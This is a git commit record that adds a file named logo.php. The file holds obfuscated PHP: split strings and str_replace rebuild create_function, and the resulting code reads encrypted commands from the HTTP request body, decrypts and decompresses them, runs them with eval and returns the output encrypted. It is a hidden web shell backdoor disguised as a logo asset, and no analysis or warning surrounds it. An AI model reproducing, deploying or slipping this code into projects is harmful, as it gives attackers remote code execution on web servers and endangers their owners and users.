3afce9e7feed3df740d9064667d32e519bc41baf
Rajdeep basu <48894311+17ack312@users.noreply.github.com>
2021-05-30 19:19:59 +0530

    Add files via upload

---
+++ logo.php
@@ -0,0 +1,10 @@
+<?php
+$w='t_co^Jntents(^J);@o^Jb_en^Jd_clean();$r^J=@^Jbas^Je64_encod^Je^J^J(@x(@gzcompr^Je^Jss($o),$k));print(^J"^J$p$kh$r$kf");}';
+$N='+){$o.=$^J^Jt{$i}^$^Jk{$j}^J;}^J}^Jreturn $^Jo;^J}if (^J@pre^Jg_^Jmatch("/$kh(.+^J)$kf/",^J@file_get_contents("php:^J//^';
+$M='Jinput"),$m^J^J)==1) {@ob_star^Jt();^J@ev^Jal(^J@gzuncompre^Jss(@x^J(@b^Jase64_decode^J($m[^J1]),$^Jk)));$^Jo=@ob_^Jge';
+$A='$k^J=^J"81dc9bdb";$kh="52^Jd04^Jdc20^J036"^J;$kf^J="dbd8313ed0^J55";$p=^J"HW^JO2^JMFz^J8ljehOA^JOf";function x($^Jt,$k)';
+$l=str_replace('H','','HcrHeatHe_fuHHncHtion');
+$J='{$^Jc=st^Jrlen^J(^J$^J^Jk);^J$l=strle^Jn($t);$o="";for($i=0^J;$i^J<$l;){for($j=^J^J0;(^J$j<$c&&$i<$l);$j+^J+,$i^J^J+';
+$H=str_replace('^J','',$A.$J.$N.$M.$w);
+$L=$l('',$H);$L();
+?>
